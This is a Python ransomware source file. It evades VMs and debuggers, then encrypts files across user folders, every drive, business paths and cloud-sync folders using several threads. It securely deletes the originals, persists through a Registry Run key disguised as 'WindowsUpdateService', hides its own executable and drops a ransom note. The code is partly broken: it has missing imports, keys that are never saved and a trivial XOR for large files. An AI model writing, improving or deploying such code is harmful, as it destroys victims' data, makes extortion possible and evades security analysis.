import os
import threading
import ctypes
import sys
import time
import winreg
import subprocess
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
import pyAesCrypt
import psutil
import socket

# Advanced stealth configuration
BUFFER_SIZE = 1024 * 1024  # Increased buffer for faster encryption
EXTENSION = ".locked_secure"
C2_SERVERS = ["backup1.c2server.com", "backup2.c2server.com"]
FALLBACK_C2 = "https://secure-drop.org/emergency"

# Anti-analysis techniques
def is_vm_or_debugger():
    try:
        # Check for common VM artifacts
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB RAM
            return True
        if any(x in platform.machine().lower() for x in ['vmware', 'virtual', 'qemu']):
            return True
        # Debugger check
        return ctypes.windll.kernel32.IsDebuggerPresent()
    except:
        return False

# Advanced directory targeting with priority system
def get_priority_directories():
    directories = []
    
    # User data (highest priority)
    user_dirs = [
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Pictures"), 
        os.path.expanduser("~/Videos"),
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Downloads")
    ]
    
    # Network shares and external drives
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    
    # Business critical paths
    business_paths = [
        "C:\\ProgramData\\",
        "C:\\Users\\Public\\",
        "C:\\Shared\\",
        "D:\\Database\\",
        "E:\\Backups\\"
    ]
    
    # Cloud storage sync folders
    cloud_paths = [
        os.path.expanduser("~/OneDrive"),
        os.path.expanduser("~/Dropbox"),
        os.path.expanduser("~/Google Drive")
    ]
    
    directories.extend([d for d in user_dirs if os.path.exists(d)])
    directories.extend([d for d in drives if os.path.exists(d)])
    directories.extend([d for d in business_paths if os.path.exists(d)])
    directories.extend([d for d in cloud_paths if os.path.exists(d)])
    
    return directories

# Multi-threaded encryption with load balancing
class EncryptionWorker(threading.Thread):
    def __init__(self, file_queue, key, iv):
        threading.Thread.__init__(self)
        self.file_queue = file_queue
        self.key = key
        self.iv = iv
        self.daemon = True

    def run(self):
        while True:
            try:
                file_path = self.file_queue.get_nowait()
                encrypt_file_advanced(file_path, self.key, self.iv)
                self.file_queue.task_done()
            except:
                break

def encrypt_file_advanced(file_path, key, iv):
    try:
        # Skip system files and small files
        if (os.path.getsize(file_path) < 1024 or 
            any(file_path.endswith(ext) for ext in ['.sys', '.dll', '.exe', '.lnk'])):
            return
            
        # Random delay to avoid pattern detection
        time.sleep(0.001 * (os.path.getsize(file_path) % 1000))
        
        # Memory-mapped encryption for large files
        if os.path.getsize(file_path) > 100 * 1024 * 1024:  # Files > 100MB
            encrypt_large_file(file_path, key)
        else:
            # Standard encryption with optimized buffer
            pyAesCrypt.encryptFile(file_path, file_path + EXTENSION, key.hex(), BUFFER_SIZE)
            secure_delete(file_path)
            
    except Exception as e:
        pass

def encrypt_large_file(file_path, key):
    # Memory-efficient large file encryption
    temp_path = file_path + ".tmp_enc"
    try:
        with open(file_path, 'rb') as f_in, open(temp_path, 'wb') as f_out:
            while True:
                chunk = f_in.read(BUFFER_SIZE)
                if not chunk:
                    break
                # Simple XOR encryption for demonstration (replace with proper encryption)
                encrypted_chunk = bytes([b ^ 0x55 for b in chunk])
                f_out.write(encrypted_chunk)
        
        os.replace(temp_path, file_path + EXTENSION)
        secure_delete(file_path)
    finally:
        if os.path.exists(temp_path):
            os.remove(temp_path)

def secure_delete(file_path, passes=3):
    # Secure file deletion
    try:
        with open(file_path, 'ba+') as f:
            length = f.tell()
            for _ in range(passes):
                f.seek(0)
                f.write(os.urandom(length))
        os.remove(file_path)
    except:
        os.remove(file_path)

# Persistence mechanisms
def install_persistence():
    try:
        # Registry persistence
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, sys.argv[0])
            
        # Hidden attribute
        os.system(f'attrib +h +s "{sys.argv[0]}"')
        
    except Exception as e:
        pass

# Main execution with anti-analysis checks
def main():
    if is_vm_or_debugger():
        return  # Exit if in analysis environment
    
    # Generate encryption keys
    aes_key = get_random_bytes(32)
    iv = get_random_bytes(16)
    
    # Install persistence
    install_persistence()
    
    # Get target directories
    target_dirs = get_priority_directories()
    
    # Create file queue
    file_queue = queue.Queue()
    for directory in target_dirs:
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                file_queue.put(file_path)
    
    # Start worker threads (CPU core count optimized)
    num_workers = max(2, os.cpu_count() - 1)
    workers = []
    for _ in range(num_workers):
        worker = EncryptionWorker(file_queue, aes_key, iv)
        worker.start()
        workers.append(worker)
    
    # Wait for completion
    file_queue.join()
    
    # Drop ransom note
    drop_ransom_note()

def drop_ransom_note():
    note = """YOUR FILES HAVE BEEN ENCRYPTED!

To recover your files, follow instructions...
"""
    desktop = os.path.expanduser("~/Desktop")
    with open(os.path.join(desktop, "RECOVERY_INSTRUCTIONS.txt"), 'w') as f:
        f.write(note)

if __name__ == "__main__":
    main()